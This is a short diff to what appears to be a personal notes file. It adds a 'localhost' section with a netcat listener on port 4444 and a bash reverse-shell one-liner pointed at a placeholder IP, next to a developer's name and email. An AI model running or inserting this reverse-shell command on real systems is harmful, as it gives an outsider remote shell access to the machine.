@@ -76,6 +76,10 @@ shrek
 # password
 not yet
 
+# localhost 
+- nc -lvp 4444
+- bash -c 'bash -i >& /dev/tcp/<TON_IP>/4444 0>&1'
+
 # developer
 - Prénom NOM: Mouhamed DIOUF
 - email: seydiahmedelcheikh@gmail.com
